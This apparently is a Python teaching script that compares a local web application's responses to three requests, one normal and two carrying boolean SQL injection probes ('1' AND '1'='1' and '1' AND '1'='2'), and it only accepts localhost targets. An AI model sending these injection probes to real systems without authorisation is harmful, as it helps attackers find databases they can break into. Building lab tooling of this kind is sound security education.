"""Local SQLI-001 boolean comparison draft. Requires manual deployment setup."""
import argparse
import hashlib
import json
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse
from urllib.request import HTTPRedirectHandler, Request, build_opener


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def local_url(base, path):
    url = urljoin(base.rstrip("/") + "/", path)
    original, target = urlparse(base), urlparse(url)
    if target.scheme not in ("http", "https") or target.hostname not in ("localhost", "127.0.0.1", "::1"):
        raise ValueError("Only a local teaching target is accepted")
    if target.username or target.password or (target.scheme, target.netloc) != (original.scheme, original.netloc):
        raise ValueError("Target must remain on the declared local origin")
    return url


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--path", required=True, help="Actual deployed path; not inferred from a hidden lesson name")
    parser.add_argument("--cookie-file", type=Path)
    args = parser.parse_args()
    url = local_url(args.base_url, args.path)
    cookie = args.cookie_file.read_text(encoding="utf-8").strip() if args.cookie_file else ""
    if "\r" in cookie or "\n" in cookie:
        raise ValueError("Cookie file must contain one header value")
    opener = build_opener(NoRedirect())
    observations = []
    for label, value in (("normal", "1"), ("true", "1' AND '1'='1"), ("false", "1' AND '1'='2")):
        parsed = urlparse(url)
        query = [(k, v) for k, v in parse_qsl(parsed.query) if k != "id"] + [("id", value)]
        request = Request(parsed._replace(query=urlencode(query)).geturl(), headers={"Cookie": cookie} if cookie else {})
        try:
            with opener.open(request, timeout=10) as response:
                status, body = response.status, response.read()
        except HTTPError as exc:
            status, body = exc.code, exc.read()
        observations.append({"case": label, "status": status, "bytes": len(body), "body_sha256": hashlib.sha256(body).hexdigest()})
    print(json.dumps({"observations": observations, "verdict": "Manual response and query-behaviour review required; hashes alone do not confirm SQL injection"}, indent=2))


if __name__ == "__main__":
    main()
